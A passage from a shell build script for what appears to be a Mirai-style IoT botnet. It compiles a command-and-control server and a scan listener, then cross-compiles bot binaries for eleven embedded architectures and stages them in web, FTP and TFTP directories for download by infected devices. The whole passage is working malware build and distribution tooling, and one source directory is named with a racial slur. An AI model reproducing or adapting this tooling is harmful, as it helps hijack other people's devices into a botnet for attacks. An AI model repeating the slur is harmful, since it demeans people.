...
go build -o loader/cnc nigger/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go
echo "COMPILING i586"
compile_bot i586 SSH.x86 "-static"
echo "COMPILING mips"
compile_bot mips SSH.mips "-static"
echo "COMPILING mipsel"
compile_bot mipsel SSH.mpsl "-static"
echo "COMPILING armv4l"
compile_bot armv4l SSH.arm "-static"
echo "COMPILING armv5l"
compile_bot armv5l SSH.arm5 "-static"
echo "COMPILING armv6l"
compile_bot armv6l SSH.arm6 "-static"
echo "COMPILING armv7l"
compile_bot armv7l SSH.arm7 "-static"
echo "COMPILING ppc"
compile_bot powerpc SSH.ppc "-static"
echo "COMPILING sparc"
compile_bot sparc SSH.spc "-static"
echo "COMPILING m68k"
compile_bot m68k SSH.m68k "-static"
echo "COMPILING sh4"
compile_bot sh4 SSH.sh4 "-static"
cp release/SSH* /var/www/html/bins
cp release/SSH* /var/ftp
mv release/SSH* /var/lib/tftpboot
rm -rf release
###################################################################
